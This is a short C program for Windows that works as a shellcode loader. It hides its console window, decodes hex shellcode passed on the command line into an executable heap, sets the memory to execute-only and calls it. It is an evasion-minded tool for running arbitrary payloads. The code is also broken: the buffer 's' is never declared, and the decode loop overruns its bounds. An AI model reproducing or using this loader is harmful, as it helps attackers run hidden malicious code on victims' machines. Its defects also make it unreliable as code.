#include <stdio.h>
#include <Windows.h>

int main(int argc, char *argv[]) {
    //Hiding Console Window
    HWND hWnd = GetConsoleWindow();
    ShowWindow( hWnd, SW_HIDE );

    unsigned int char_in_hex;
    char *shellcode=argv[1];
    unsigned int iterations=strlen(shellcode);
    unsigned int memory_allocation = strlen(shellcode) / 2; 

    //Converting shellcode to hex 
    for(unsigned int i = 0; i< iterations-1; i++) {
        sscanf(shellcode+2*i, "%2X", &char_in_hex);
        s[i] = (char)char_in_hex;
    }

    LPVOID heap;

    //Heap Creation with HEAP_CREATE_ENABLE_EXECUTE flag
    heap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);

    //Heap Allocation with the size of shellcode
    void *exec = HeapAlloc(heap, 0, memory_allocation);
    //void *exec = VirtualAlloc(0, memory_allocation, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

    //Copying shellcode to heap
    memcpy(exec, s, memory_allocation);
    // to accomodate nop gen NOPS.
    // memcpy(exec, nopss, memory_allocation);
    // memcpy(exec + sizeof(nopss), s, memory_allocation);
    DWORD ignore;

    //Changing memory permissions to X for shellcode execution
    VirtualProtect(exec, memory_allocation, PAGE_EXECUTE, &ignore);

    //Calling Shellcode
    (*(void (*)()) exec)();
    return 0;
}
